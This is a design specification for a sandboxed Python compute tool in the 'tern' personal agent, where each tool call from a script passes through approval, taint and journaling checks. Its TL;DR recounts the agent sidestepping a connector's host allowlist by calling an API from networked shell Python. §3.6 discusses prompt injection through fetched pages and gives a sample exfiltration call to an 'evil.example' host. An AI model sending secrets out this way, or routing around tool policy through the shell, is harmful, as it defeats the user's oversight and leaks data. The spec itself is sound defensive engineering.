# tern `python`: sandboxed compute that calls tools, not the network

Status: PY0 and PY1 built (2026-11-04): read-only compute, run in a sandboxed `tern __monty-exec` helper; PY1b (the
asking and `gather` half) and PY2 (writes) built after that, with `statistics` and `string` added to the standard
library; see §9 and DECISIONS.md PY0, PY1, PY1b+PY2. Not built: `reuse_reads`, the stub list in the prompt, streamed
`print`, the inspector's nesting, the determinism fuzz and `cargo deny` from PY1b, and all of PY3.
Builds on T0 (effects), T3a (taint), T3 (outbox, autonomy) and the step journal.
Interpreter: [Monty](https://pydantic.dev/monty), Pydantic's Python subset written in Rust. Monty facts below were
checked against Monty 1.4.0 on 2026-11-04 (§11). Related:
- [personal-agent-tooling-spec.md](personal-agent-tooling-spec.md) §5 (effects, outbox, taint, autonomy), §12 (stages).
- [sandbox-design.md](sandbox-design.md): the `shell` sandbox, which this takes compute away from.
- `docs/agent-profiles-design.md` §1.2 (tool scope; on the agent-profiles branch, not yet on main).
- DECISIONS.md: T0, T3a, T3.

## TL;DR

- **The problem.** A user had tern write a Luau connector for a county property API. tern used it for one address.
  Then the user asked it to "compare my address with others in the area", which takes many lookups plus some
  aggregation. tern switched to Python through `shell`. With `[sandbox] network = true` (then the default), that Python
  called the API directly. That skipped the connector's host allowlist, its effect, taint and the step journal. The
  model did nothing wrong by its own lights: loops and arithmetic are what Python is for, and `shell` was the only
  Python it had.
- **The fix.** A `python` tool for compute, built on Monty. A script calls tern's own tools as functions:
  `lua__county__lookup(address=a)` in a loop. **Each call goes back through the host**: scope, `approval::check`,
  effect, taint, the tainted host limit, and a journaled sub-step. The script itself has no network, no environment,
  no processes and no files beyond a read-only view of the workspace. So compute no longer needs the shell, and the
  shell's network is no longer the path of least resistance.
- **v1 is read-only.** Scripts can call `read` tools only, and the tool itself is `read`, so it never asks. Writes
  come in PY2, through the same approval prompt or the outbox. `destructive` tools are never callable from a script.
- **Resume by re-running, not by snapshots.** The clock is frozen, `random` is seeded from the run, and every host
  call's result is journaled. A script interrupted by a crash runs again from the top, and its host calls are
  answered from the journal. Divergence is caught by the journal's existing input hash.
- **Out of process (PY1, built).** The daemon runs scripts in `tern __monty-exec`, a helper child process under the
  existing Seatbelt/Landlock profile with network off. Monty's memory limit counts at the global allocator, so a
  per-script process is also the only clean way to cap memory. A crash, a stack overflow or a Monty bug kills the
  helper, not the daemon. (PY0 ran Monty in-process; that mode remains for tests, §5.2.)
- **Cost.** Monty is pure Rust and MIT. It adds an estimated 3–8 MB to the binary (PY0 measures this), and it needs
  Rust 1.96 where tern declares 1.89. The language is a subset: no classes with inheritance, no generators, no
  pandas or numpy. For those, `shell` with `python3` stays, and asks every time.

The small fix for the shell itself lands separately: shell output is tainted when the network is on, a prompt rule
says to use integration tools rather than calling their APIs from the shell, and `tern doctor` notes
`network = true`. This spec doesn't repeat it. That fix makes the bypass visible; this one removes the reason for it.
Since PY0, shell networking is also **off by default**: a command gets it only with `network: true`, approved every
time (docs/sandbox-design.md), so the bypass needs a click.

## 1. Why a new tool, and why Monty

### 1.1 What compute through `shell` costs today

| | `shell` + `python3` (today) | `python` (this spec) |
|---|---|---|
| Approval | `destructive`: asks every time, offers "always" for a pattern | `read`: never asks; its host calls are checked one by one |
| Network | On by default; unconfined with a warning if there's no OS sandbox | None. Data comes in only through tool calls |
| Connector policy | Bypassed: the script calls the API with its own HTTP client | Enforced: each lookup *is* a connector call |
| Taint | Not set by the script's reads (until the separate fix) | Untrusted results taint the run and the script's output |
| Journal | One opaque step; a crash mid-script loses or repeats everything | One step plus one sub-step per host call; re-runs answer from the journal |
| Limits | Timeout only; no CPU or memory limits on the host backend | Time, memory, host calls, output |
| Start-up | ~20–50 ms to spawn `python3` | ~5 ms cold in-process (Monty's figure); a few ms more for the helper |
| Language | All of CPython plus whatever is installed | A subset (§5.3) |

The last row is the price. Most of what the model reaches for Python to do (loop, filter, group, sum, sort, parse JSON
and CSV, regex, dates) is in the subset.

### 1.2 Alternatives considered

| Option | For | Against |
|---|---|---|
| **Monty** (recommended) | Python, which models write best. Host functions suspend the interpreter, which is exactly the bridge we need. No file, network or process access unless the host provides it. Frozen clock and seeded random. Pure Rust, MIT. Used by Pydantic AI's CodeMode | A subset. Young (1.0 in September 2026, weekly releases). MSRV 1.96. Binary size unmeasured |
| Luau compute, reusing `tern-lua` | Already embedded and sandboxed; no new dependency | Models write Luau noticeably worse than Python, and it has no regex (Lua patterns only) or CSV. Every script would be a small fight |
| RustPython | Fuller Python | No sandbox model and no suspend/resume for host calls; we would build both |
| Pyodide or CPython on WASI under wasmtime | Real CPython, some packages | 13–54 MB, slow start, and host calls through WASI shims. Breaks the binary-size budget (tooling spec §1) |
| `python3` with network off | Nothing to build | No per-call policy: either the script has the network and bypasses connectors, or it has no data. Leaves "compute" asking every time |

## 2. The tool

### 2.1 Interface

```json
{
  "name": "python",
  "input": {
    "code":   "string, required. A script in tern's Python subset.",
    "inputs": "object, optional. Each key becomes a global variable holding the JSON value."
  }
}
```

- **Effect `read`, idempotent.** The tool does nothing outside the interpreter itself. Everything that reaches out
  is a host call with its own check (§3). So `python` never asks on its own, keeps working in `readonly` autonomy, and
  is in scope for new agent profiles by default (§7.1).
- **What comes back** is one tool result in this shape. The result value is the script's last expression, as in a
  REPL, converted to JSON:

  ```
  result:
  {"median": 412000, "n": 24, "mine_rank": 7}
  printed:
  looked up 24 of 24
  tool calls: lua__county__lookup ×24
  ```

  `result` is omitted when the last statement isn't an expression or evaluates to `None`. Values that don't map to
  JSON (a dataclass, a set, a date) are converted the way Monty's `MontyObject` serializes them, with a `repr`
  fallback. `printed` is what the script wrote with `print`, in order.
- **Output limit.** The whole result is cut to the existing `MAX_TOOL_OUTPUT` (32 KB, middle-truncated) like any
  tool's. Inside that, `printed` gets at most 16 KB, so a chatty loop can't crowd out the result. The prompt (§6.1)
  says to return summaries, not raw data.
- **Errors** come back as an error result with `printed` so far and the host calls made, so the model can see how
  far it got (§6.2).
- **Live output.** `print` chunks stream through the existing `ProgressSink` as `tool_output` events, as `shell`
  output does, so the TUI and desktop show progress on long loops.

### 2.2 The workspace, read-only

The workspace is mounted read-only at `/workspace` through `monty-fs` (cap_std; symlinks are refused). `open`,
`pathlib.Path.read_text` and `csv.reader(open(…))` work there and nowhere else. It is the same view `read_file` has
inside the workspace, which never asks. tern's data directory is never mounted, even when the workspace sits inside
it (the same rule as the shell sandbox). Reads are capped at 8 MB per file and 64 MB per script.

There are no writes in v1, not even to the workspace. A script that wants to save something returns it, and the model
calls `write_file`. That keeps every write a visible top-level call until PY2 decides how writes from scripts behave
(§3.5).

## 3. Host functions: tools as Python functions

### 3.1 Which tools a script can call

The callable set is computed per call of `python`:

1. Start from the tools the **run** may call: its scope (sub-agent scope today, agent profile scope with AP0, §7.1).
   A script can never reach a tool the run couldn't call directly.
2. Keep only tools whose **effect is `read`** (v1). PY2 adds `write`. `destructive` is never callable.
3. Remove the tools that make no sense or aren't safe inside a script, whatever their effect:
   - `python` itself (no recursion);
   - `shell` (destructive anyway, and the thing this replaces);
   - `agent_*`, `channel_post`, `secret_request`, `connector_*`, `schedule_*`: they start runs, talk to the user or
     change tern's own configuration. They are meant to be seen as top-level steps;
   - anything with `local_approval` (host commands outside the sandbox).

In v1 that leaves `read_file`, `list_dir`, `search_files`, `http_fetch`, `memory_search`, `session_search`,
`channel_read`, `skill_read`, `schedule_list`, `agent_status`, and every Luau and MCP tool that is `read`. For the
motivating case, that is `lua__county__lookup`.

### 3.2 Names and arguments

- **Same names as the tool list.** A tool is called by the name the model already sees: `lua__county__lookup`,
  `mcp__github__search_issues`, `http_fetch`. A second naming scheme would be one more thing to get wrong, and
  `[A-Za-z0-9_]` names are already valid Python identifiers. (MCP names may contain `-`, which Python can't. Those
  get `-` → `_`, and the stub list in the prompt shows the Python spelling.)
- **Arguments.** Keyword arguments map to the tool's JSON input schema properties. Positional arguments fill the
  schema's `required` properties in order, so `lua__county__lookup("12 Elm St")` works when `address` is the only
  required field. A single positional `dict` is taken as the whole input. Unknown keywords are an error before the call
  is made, with the valid names in the message.
- **Return value.** If the tool's result content parses as JSON, the function returns the parsed value (dicts, lists,
  numbers). Otherwise it returns the string. Luau connectors already return JSON tables, so the common case is a dict.
- **Errors.** A tool error (`is_error`) raises `RuntimeError("lua__county__lookup: <first line of the error>")`. Monty
  has no user exception classes (no inheritance), so a built-in type it is. A refusal raises `PermissionError` (§3.4).
  Scripts can `try`/`except` around each lookup and carry on.
- **Async.** Every host function is also awaitable: `await lua__county__lookup(a)` inside `async def`, and
  `asyncio.gather(*[lua__county__lookup(a) for a in addrs])` runs them concurrently through Monty's pending futures
  (`resume_pending` / `RunProgress::ResolveFutures`). The host runs at most `max_parallel` (default 4) at once, so a
  `gather` of 200 doesn't stampede a county server. Connector rate limits (T4b-i) apply per call on top.
  **Built (PY1b), with two differences from the picture above.** (1) Monty doesn't say, at a host call, whether the
  script will `await` it: `r = f(x)` and the `f(x)` inside `asyncio.gather(f(x), f(y))` look the same. So the mode is
  chosen once per script from its source (`scan::uses_async`: `async`, `await` or `asyncio` outside comments and
  strings). In an async script every tool call returns an awaitable; in any other it returns the value, as in PY0. An
  immediate `await f(x)` is answered on the spot (`resume_eager`); calls collected for `gather` run together when the
  script awaits them. (2) Results go back to Monty **all at once, in call order**, once every call of the batch has
  finished, so what the script sees can't depend on which tool was faster, and a re-run sees the same. Monty 1.4.0's
  `gather` has no `return_exceptions`, so one failing call raises for the whole `gather`; a hint tells the model to
  wrap each call in a small async function that catches its own errors. An upstream `return_exceptions` (or a way to
  tell a bare call from an awaited one) would remove both workarounds.
- **Stubs.** The host generates a typed stub per callable tool from its input schema
  (`def lua__county__lookup(address: str, *, year: int = ...) -> dict: ...`). The prompt lists them (§6.1). PY3 can
  also feed them to Monty's type checker (`monty-type-checking`) to catch wrong names and arguments before any host call
  runs.

### 3.3 Each call is a journaled sub-step

A host call takes exactly the path a top-level call takes in `agent.rs`, minus the model:

1. Scope check (`tool::in_scope`), then the call's `ToolPolicy` from the tool.
2. `approval::check(tool, policy, granted, Gate { tainted, autonomy })` with the run's **current** taint, which may
   have been set by an earlier call in the same script.
3. If the check can ask, an `approval` sub-step (§3.4).
4. A `tool` sub-step that runs the tool through `ToolRegistry::call_in` and records its `ToolResult`, `untrusted`
   flag included.
5. If the result is untrusted, `taint.mark(..., "python called <tool>")`, so the next call in the script is checked
   as tainted.

**Where sub-steps live.** The `python` call is the tool step at index *N*. Its host calls take the indexes after it,
*N*+1 … *N*+*k*, in the order the script makes them (the order Monty suspends, which is deterministic, §4.1). Their
inputs are `{"in": N, "seq": i, "call": {"name", "input"}}`, so their hashes can never collide with a top-level step,
and the run inspector can nest them under the script. The `python` step's output records `sub_steps: k`. When step *N*
replays as completed, the loop skips to *N*+*k*+1 without running anything. Steps complete out of order (*N* after
*N*+*k*), which the journal already allows because it is keyed by index.

**What the sub-steps are (PY1b, PY2).** Each is a `py_call` step. Sub-step *N*+1 records the clock and seed (the
`env` step). For each tool call the script makes, in order: if the call needs the user's answer, an **ask** sub-step
(`{"in": N, "seq": i, "ask": {name, input}}`, its output the decision and what the script is told if it didn't run),
then the **call** sub-step (`{"in": N, "seq": i, "call": {…}}`). A call a grant or the autonomy level lets through has
no ask step. Calls that a script makes together (`gather`) are planned and numbered in order, then run up to
`max_parallel` at a time; each is journaled under its own number.

Sub-steps append no conversation messages: there is no `tool_use` for them to pair with. The model sees one result,
the script's. The ledger, `tern runs show` and the run inspector see every call.

### 3.4 Approvals and refusals mid-script

In v1 the callable tools are all `read`, but a read can still ask:
- `read_file` outside the workspace is a forced read;
- in a tainted run, `http_fetch` to a host the run hasn't reached asks (T3's host limit);
- an MCP tool whose server sets `requires_approval`.

When a host call needs an answer, **the script waits**. Monty is suspended at the `FunctionCall`, which costs no CPU,
and the helper process sits idle. The approval prompt is the one the user already knows, with one line added:
"from a python script (call 7 of this script)". The prompt's detail view shows the script. Time spent waiting doesn't
count against the script's time limits (§5.1).

| Outcome | What the script sees |
|---|---|
| Approved | The call runs; the function returns its result |
| Denied, or a `read` prompt that times out | `PermissionError("lua__x: denied by the user")` |
| `Check::Forbid` (money movement, trade) | `PermissionError` with the forbidden message; never asks |
| `Check::ReadOnly` (readonly autonomy, PY2 writes) | `PermissionError("…: this run is read-only")` |
| Out of scope | `PermissionError("…: not available to this agent")`, the same as a direct call |

**Built (PY1b).** The ask goes through the same `Agent::decide` as a top-level call (grants, taint, autonomy, the
tainted host limit, the outbox), as an *ask* sub-step; the prompt carries `ApprovalRequest::script` ("from a python
script (call 7 of this script)", then the script, cut to 2000 bytes), which the headline, the TUI, Telegram, the CLI and
the desktop card's detail view show. Waiting is counted in `ScriptHost::waited` and subtracted from `max_wall_seconds`.
A standing host grant answers the tainted host limit without a prompt and without counting toward `max_asks`; within one
`gather` batch, one approval for a host covers the batch's other calls to it (as a sequence of calls would). All of a
batch's checks see the taint the script had when the batch began: calls made together can't depend on each other.
A re-run answers journaled asks from the journal, whatever the grants say now.

At most `max_asks` (default 3) prompts per script. The fourth call that would ask raises `PermissionError` with "too
many approvals in one script; call this tool directly". A loop shouldn't turn into 50 prompts; that is approval
fatigue (tooling spec W7) with extra steps.

### 3.5 Writes (PY2)

PY2 lets a script call `write` tools. `destructive` stays excluded: those should always be one visible call, with
the model's reasoning beside it.

- A granted write (`write_file` in the workspace, `memory_save`) runs without asking, exactly as a top-level call
  does. In a tainted run it asks, as T3a decided, and counts toward `max_asks`.
- A write that asks and is approved runs.
- **A write nobody answers goes to the outbox** (T3), as at top level: `decide` queues it, the approval sub-step
  records `deferred`, and the host function **returns** `{"queued": true, "outbox": 12, "tool": "…"}` rather than
  raising. That is the outbox's contract ("continue with anything that doesn't depend on it"), and the script can say
  so in its result. On replay the journaled `deferred` outcome returns the same value and never queues twice.
- `readonly` autonomy refuses every write with `PermissionError`. That holds for routines and for profiles with a
  read-only ceiling.
- Writes from scripts are capped at `max_writes` (default 10) per script, separately from `max_asks`.

PY2 is not in v1 because the read-only version already fixes the motivating case, and how writes from loops should
look to the user (one card per write, or one card per script, §10) deserves real use first.

**Built (PY2), behind `[python] allow_writes` (off by default).** One card per write, as open question 3's simple
option. `write` tools join the callable set (`callable_in_scripts(name, effect, allow_writes)`); `destructive` ones never
do, and the per-call policy is checked again (a `write` call of a tool declared `read` is refused too). A deferred write
returns `{"queued": true, "outbox": <id>, "tool": "…"}` (the id parsed from the outbox message by
`outbox::deferred_id`); a write that runs is recorded in the activity ledger like a direct one. `max_writes` counts the
writes let through (refused and queued ones don't), and the call that would exceed it is refused before anyone is asked.

### 3.6 Taint

- **An untrusted host result taints the run** at that sub-step, with the reason "python called http_fetch". Taint is
  rebuilt on replay from the journaled `untrusted` flag, as for any tool step.
- **The script's own result is then untrusted**, and reaches the model wrapped in `<untrusted source="python">`. A
  script that summarizes 40 web pages has to pass on some of their text, so its summary is untrusted too.
- **Inside the script, untrusted data is data, unless the script evals it.** Checked in PY0: Monty *does* have
  `eval` (`eval('1+1')` is 2). A script that evals text it fetched could be steered by that text, but only within
  what the script could do anyway: the same callable tools, each checked with the run's taint, which that fetch has
  already set. Short of `eval`, injected text in a page can change what the script *computes*. It cannot change
  which calls the script makes unless the script's own logic branches on it. That's a real improvement
  on the model reading 40 pages into its context, where every page gets a turn at steering it.
- **The tainted host limit still bites.** A script that reads an untrusted page and then calls
  `http_fetch(f"https://evil.example/?q={secret}")` hits a new host in a tainted run, so the call asks (§3.4) and shows
  the URL. That is the read-only exfiltration path the host limit exists for.
- A script run in an untainted run whose results are all trusted (a Luau connector without `untrusted = true`)
  leaves the run clean. The county lookup is trusted data from a host the user approved.

## 4. Journaling and resume

### 4.1 Deterministic re-run, not snapshots

A `python` step is replayed like this:

- **Completed**: its journaled `ToolResult` is returned and nothing runs. This is the common case.
- **Started but not completed** (the daemon died mid-script): the script runs again from the top. The host answers
  each host call whose sub-step is already journaled from the journal, without calling the tool. The first call
  without a sub-step runs live, and the script carries on from there. The step is `InFlight::Retry`: re-running it is
  safe because everything with an outside effect is a journaled sub-step.

For this to work, the script must make the same calls in the same order on the second run. What could make it
differ, and what pins it:

| Source of difference | Pinned by |
|---|---|
| `time.time()`, `datetime.now()` | Monty's OS policy (`with_os_policy`) with a frozen clock: the completion time of the llm step that issued the call, read from the journal. The same on every replay |
| `random` | Seeded from `hash(run_id, call_id)` |
| `time.sleep`, `asyncio.sleep` | Virtual: advances the frozen clock and returns at once. `max_total_sleep` set to 0 real seconds |
| Host results | Fed from the journal |
| Completion order of concurrent calls | **Built differently:** a batch of awaited calls is answered all at once in call order after every call has finished, so completion order is never observable and nothing needs recording (§3.2) |
| Workspace files | **Not pinned.** A file read through the mount may have changed since. Reads through the mount are recorded as a content hash in a sub-step (`{"in": N, "seq": i, "fs": path}` → `sha256`). A changed hash is a divergence |
| Monty version | Recorded in the step output. Not part of the input hash, so an upgrade doesn't throw the step away; a mismatch is logged |
| `id()`, `hash()` of str, dict order | Deterministic in Monty, assumed. PY0 checks this with a re-run fuzz test (§9) |

### 4.2 Detecting divergence

Divergence uses the journal's existing check: a sub-step's input hash covers the tool name, arguments and sequence
number. If the re-run script asks for something different at *N*+*i* than was recorded:

- **All journaled sub-steps from *i* on are reads** (always, in v1): the journal truncates from *N*+*i* as it does
  for any divergence, logs `journal divergence`, and the script continues live. Repeating a read is harmless.
- **One of them was an executed write** (PY2, built: `Agent::diverged`; it also counts a write queued in the outbox):
  the script does **not** continue. The `python` step completes with an
  error naming the writes that already ran ("script changed on resume after these calls ran: write_file notes.md"),
  and the model decides what to do. Writes are never re-executed by a divergent replay.

### 4.3 Why not Monty's dumps

Monty can `dump()` a suspended session and `Dump::load()` it later, so a script waiting on a host call could be
saved and resumed. We don't use it:

- **Unauthenticated input.** Monty's docs say snapshots are not authenticated or fully validated, and should only be
  loaded from a trusted, compatible producer. Storing them in tern's database makes the database a place to plant
  bytes that the interpreter will parse.
- **Version coupling.** The format is versioned (`DUMP_VERSION`, `MIN_SUPPORTED_DUMP_VERSION`) and Monty releases
  weekly. A tern upgrade could strand every paused script.
- **Size.** Dumps can be large (the research brief notes a 256 MiB cap), and they would be per paused script.
- **Nothing to gain.** Re-running is cheap (milliseconds of interpreter time) because every expensive or external
  thing is already journaled. A daemon restart while a script waits on an approval simply re-runs to that point
  and asks again with the same approval sub-step.

Dumps may be worth revisiting if scripts ever do minutes of pure computation between host calls. They shouldn't.

## 5. Limits and isolation

### 5.1 Limits

| Limit | Default | Enforced by |
|---|---|---|
| Interpreter time per script | 30 s | Monty `max_feed_duration_secs`; the helper's `RLIMIT_CPU` and a host kill as a backstop |
| Interpreter time between host calls | 10 s | Monty `max_turn_duration_secs` |
| Wall time per script, excluding approval waits | 10 min | The host, which kills the helper. Covers slow host calls |
| Memory | 256 MB | Monty `max_memory` (counted at the helper's global allocator) plus `RLIMIT_AS`/`RLIMIT_DATA` on the helper |
| Host calls per script | 200 | The host counts them and calls `FunctionCall::abort`. Monty's own `max_suspensions` cap is enforced by its pool, **not** for direct embedders, so we must |
| Concurrent host calls | 4 | The host |
| Approvals per script | 3 (§3.4) | The host |
| Recursion | 1000 frames | Monty (fixed); catchable `RecursionError` |
| Code size | 64 KB; inputs 1 MB | The host, before starting |
| Output | 32 KB total, 16 KB printed (§2.1) | The host |
| Workspace reads | 8 MB per file, 64 MB per script | The mount |

All configurable under `[python]` (§8). Hitting a time or memory limit ends the script: Monty doesn't let these be
caught, and its docs make no promise about the heap afterwards, so the helper exits and is not reused. The model gets
"stopped: used more than 256 MB" with the printed output so far.

Host calls are tool calls for every other purpose too: they show in the ledger and usage views, count toward
per-connector rate limits, and are subject to the run's cancellation token. A cancelled run kills the helper.

Compilation isn't charged to Monty's time budgets. Monty caps it structurally (200 levels of AST nesting, among
others), and the helper's wall clock covers the rest.

### 5.2 The helper process (PY1, built)

**PY0 ran Monty in the daemon's process**, on a dedicated thread with a 64 MB stack, talking to the async side over
channels shaped like the protocol below, so moving it out is a transport change. What PY0 gives up, and PY1 restores:
a native crash (Monty's README says an abort inside it "takes your process with it") ends the daemon, and
`max_memory` is enforced only by Monty's own pre-checks of predictable sizes (`'x' * 10**9` is refused), not by
counting every allocation, which needs `monty-alloc` as a per-process global allocator. Time limits, recursion and
tern's host-call cap are fully enforced in PY0.

**Built in PY1** (DECISIONS.md PY1): the daemon never runs Monty in its own process. It runs `tern __monty-exec`, the same trick as `tern __sandbox-exec`
on Linux (sandbox-design.md): `main` checks for the argument before clap.

Why out of process:
- **Memory limits need it.** Monty counts memory at the global allocator. In-process, that means installing Monty's
  allocator for the whole daemon, where scripts' allocations mix with everything else's.
- **Crash isolation.** A panic, a native stack overflow (`map`/`sorted` callbacks recurse on the Rust stack) or an
  abort in a young interpreter kills the helper, and the tool returns an error.
- **Defence in depth.** The helper runs under the shell's OS sandbox with **network off**, whatever `[sandbox]
  network` says (Seatbelt on macOS, Landlock plus seccomp on Linux), with `write_paths` dropped and tern's own
  binary directory added to its reads. If someone finds a Monty escape, it lands in a process that can't open a
  socket and can't read `~/.ssh` or `~/.tern`. As built it can still write to the workspace and temp directories at
  the OS level (the profile shell commands get; Monty's own mount is read-only), and read what `shell` can.
  `confine = "required"` refuses to run scripts when the sandbox isn't available; `"auto"` runs them anyway (Monty is
  itself a sandbox); `"off"` runs the helper unconfined. A `tern doctor` line for this is PY3.
- **Clean environment**: scrubbed like the shell's. No secrets ever reach the helper; host calls that need them run in
  the daemon.

The protocol is newline-delimited JSON on stdin/stdout (as built; calls are synchronous, so there are no call ids
yet, and `print` output comes back with the result rather than streamed):

```
daemon → helper  {code, inputs, env: {clock_secs, seed}, workspace, callable, blocked, limits}
helper → daemon  {"Call": {"name": "lua__county__lookup", "input": {...}}}
daemon → helper  {"Done": {"content": "...", "is_error": false}}  |  {"Refused": "…"}
helper → daemon  {"Finished": {"result": ..., "printed": "...", "calls": {...}}}
```

The helper is stateless between messages apart from the suspended interpreter. Journaling, approvals and tool calls
stay in the daemon. `monty-proto` (protobuf, built for Monty's pool) wasn't used: our messages are tern's own
(tool names, refusals, the journaled env), and JSON keeps the crate count down.

**Limits in the helper**: Monty's (time per script and between calls, recursion, `max_memory` now counted at the
allocator), tern's host-call cap (enforced by the helper, which aborts the run past it), a memory ceiling
(`monty-alloc` as the tern binary's global allocator, armed only in the helper at `max_memory` + 4 MB; past it the
helper exits 65 and the tool reports `MemoryError`), and `RLIMIT_CPU` at the interpreter limit + 10 s for anything
Monty can't see. The daemon kills the helper on cancel and at the wall limit (`kill_on_drop`).

Cost: one `exec` of the static tern binary per script, a few milliseconds, on top of Monty's ~5 ms cold start. A pool
of warm helpers is a PY3 option if this ever shows in traces. It still beats `python3` start-up. `tern run` and the
in-process TUI use the same helper. Unit tests may run Monty in-process.

## 6. Model guidance

### 6.1 Tool description and prompt

Tool description (kept short; the prompt section carries the detail):

> Run a Python script for computation: loops, filtering, grouping, sums and statistics, parsing JSON/CSV, regex,
> dates. The script can call your read-only tools as functions (listed in the system prompt) and read files under
> /workspace. It has no network, no shell and no packages. The last expression is returned; print() output is
> returned too. Python subset: no class inheritance, generators, `del`, or third-party modules.

A `## Compute` section in the system prompt, present when `python` is in scope:

```
## Compute

Use `python` when a task needs many tool calls plus computation, e.g. looking up 30 addresses and comparing them.
Call tools from the script by their tool name instead of calling them one by one. Never call a service's API from
`shell` when a tool already covers it: the tool carries the user's approvals and limits.

Functions available in python:
  lua__county__lookup(address: str) -> dict
  http_fetch(url: str) -> str
  read_file(path: str) -> str
  ...
Available modules: json, re, csv, math, datetime, collections, itertools, functools, decimal, random, hashlib,
tomllib, pathlib, base64, bisect, asyncio, statistics, string. Use asyncio.gather for many independent lookups.
Return a summary, not raw data: results over 32 KB are cut.
Only if a task needs pandas, numpy or another package, use `shell` with python3. It asks the user every time.
```

The function list is the stub list from §3.2. It is generated per run from the callable set, so it costs tokens. Past
`stub_budget` (default 2 KB) it lists names only and says `python_help(name)` returns a stub. `python_help` is a host
function inside the script, not another tool.

### 6.2 Errors back to the model

Errors are the main cost of a subset: the model writes CPython, and some of it won't run. Each error result says
what went wrong, where, and what to do instead, in one or two lines, plus `printed` and host calls so far.

| Error | Message (examples) |
|---|---|
| Syntax error | `SyntaxError at line 4: ...` with the line |
| Unsupported feature (parse time) | `line 2: class inheritance isn't supported in tern's python. Use functions and dicts, or @dataclass without a base class.` |
| Unknown module | `line 1: module 'pandas' isn't available. Available: json, re, csv, ... For pandas or numpy, use shell with python3 (asks the user).` |
| Missing stdlib module | `line 1: module 'enum' isn't available. Use plain constants or a dict of names to values` (`statistics` and `string` are provided by tern since PY1b+PY2, below) |
| Unknown function | `name 'county_lookup' is not defined. Did you mean lua__county__lookup?` |
| Host call error | The traceback ending in `RuntimeError: lua__county__lookup: 404 address not found` |
| Limits | `stopped: 200 host calls per script. Batch fewer lookups, or ask the user to raise [python] max_host_calls.` |

**Standard library tern adds (built).** Monty asks its host for any module it doesn't know
(`OsFunctionCall::Import`), and the host's answer becomes the module, so `tern-python/src/modules.rs` provides
`statistics` (`mean`, `fmean`, `median`, `median_low`, `median_high`, `mode`, `multimode`, `stdev`, `pstdev`,
`variance`, `pvariance`, `geometric_mean`, `harmonic_mean`, `quantiles`) and `string` (the constants). Calls to them are
answered inside the interpreter's own process: pure computation, deterministic, not journaled, not tool calls, so they
don't count against `max_host_calls`. What Monty has no host hook for stays missing: `enum`, `uuid` (non-deterministic
anyway), `operator` and `io` (they hand back callables or streams), `contextlib`.

The rewrite hints come from a small table in the host keyed on Monty's `NotImplementedError` messages and import
names: inheritance, `@property`/`@classmethod`/`@staticmethod`, `yield`, `del`, `enum`,
`operator`, `uuid`, `io`, `contextlib`. Each entry is one line of what to write instead. The table lives next to a test
that runs each offending snippet through Monty, so a Monty release that adds a feature fails the test and the hint
gets removed.

**Fixing a script shouldn't repeat its lookups.** When a script fails at call 18 and the model fixes the bug, the new
script makes the same 17 calls again. Within one run, a `read` host call with the same tool and arguments as an
earlier journaled sub-step is answered from that sub-step (`cached` in its output) instead of calling the tool again.
It's limited to the same run, read effects and idempotent tools, and can be turned off (`[python] reuse_reads =
false`). It is also what makes "now also compute the mean" cheap.

### 6.3 When to fall back to `shell`

The prompt says it once (§6.1): packages (pandas, numpy, matplotlib), data too big for the limits, or a real
CPython-only feature. The shell path is unchanged: `destructive`, asks every time, OS sandbox, network per config.
With the separate shell fix its output is tainted when the network is on, and the prompt rule says not to call
integration APIs from it. A good pattern the prompt can suggest: fetch through tools in `python`, which returns the
data, then `write_file` it, then process it with `python3` in `shell` with no network needed.

## 7. Fit with existing features

### 7.1 Agent profiles and sub-agents

- `python` is a built-in tool in a profile's scope like any other (`"builtins": [..., "python"]`). A new agent's
  default scope ("built-in tools except `shell`") includes it, since it is `read`.
- **A script's callable set is a subset of the run's scope** (§3.1, step 1). Giving an agent `python` can never widen
  what it reaches. A profile without the county connector can't call it from a script either.
- Sub-agents: the same, through their scope. A sub-agent's script is journaled in the sub-agent's run.
- A per-agent autonomy ceiling (AP3) applies through `Gate.autonomy` on each host call.

### 7.2 Taint, outbox, autonomy

Covered above: taint in §3.6, the outbox in §3.5, autonomy in §3.4 and §3.5. In short, a host call is a tool call,
and every rule that applies to one applies to the other, decided at the same function (`approval::check`) with the
same gate.

### 7.3 Budgets and iterations

- A script is one iteration of the loop (`max_iterations`) and one llm turn, however many host calls it makes. That
  is the token saving: 24 lookups in one turn rather than 24 turns, each resending the conversation.
- Host calls cost no tokens, but they are bounded by `max_host_calls` per script, and a run can make at most
  `max_iterations` scripts. Routine budgets (T1a) count tokens and are unaffected. If a per-run tool-call cap is added
  later, host calls count toward it.

### 7.4 Channels and posts

Scripts don't post (`channel_post` is excluded) and don't read the digest. `channel_read` is callable, so a script
can scan a channel's history. Its taint rule (tainted posts → untrusted result) carries through §3.6.

### 7.5 Clients

- The run inspector and `tern runs show` show a `python` step with its script and its host calls nested under it
  (from `"in": N` in their inputs), with `[cached]` and `[untrusted]` marks.
- Approval cards for a host call say "from a python script" and can expand to the script.
- No new API endpoint: the step data already flows through `/v1/runs/{id}`.

## 8. Config

```toml
[python]
enabled = true              # the tool is offered when the binary has the `python` feature
max_seconds = 30            # interpreter time per script
max_turn_seconds = 10       # interpreter time between host calls
max_wall_seconds = 600      # excluding approval waits
max_memory_mb = 256          # built as MB, a number
max_host_calls = 200
max_parallel = 4
max_asks = 3
max_writes = 10             # PY2
allow_writes = false        # PY2: write tools callable from scripts
reuse_reads = true          # §6.2 (not built)
stub_budget = 2048          # bytes of function stubs in the prompt (not built)
```

`confine` and the OS sandbox come from `[sandbox]`; scripts never get the network, whatever `[sandbox] network` says.

## 9. Phases

| Phase | Scope | Size | Exit criteria |
|---|---|---|---|
| **PY0** read-only compute (**built**) | Monty 1.4.0 pinned, MSRV 1.96, `python` cargo feature (default on). The `python` tool in-process (§5.2); host functions for `read` tools (§3.1–3.3), by tool name, synchronous; sub-step journaling and deterministic re-run (§4.1) with a journaled clock and seed; taint (§3.6); reads that would ask, and every write, refused with `PermissionError`; the read-only workspace mount; time, memory, host-call, code and output limits; errors and hints (§6.2); a `## Compute` prompt section; `runs show` lines for sub-steps | M | Met: a script loops over a Luau connector with one journaled sub-step per call; a crash mid-script resumes without repeating calls (the connector's own counter proves it); an untrusted result taints the run and the output; a write tool is refused; limits and unsupported features give clean errors with hints |
| **PY1** isolation (**built**) | `tern __monty-exec` helper under the OS sandbox with network off, `monty-alloc` ceiling and `RLIMIT_CPU` there (§5.2); JSON-lines transport; crash, OOM and CPU-limit exits turned into tool errors | M | Met: a helper that aborts mid-script is a tool error and the run finishes; the memory limit ends the helper with `MemoryError`; a crash mid-script resumes with the journaled clock and calls |
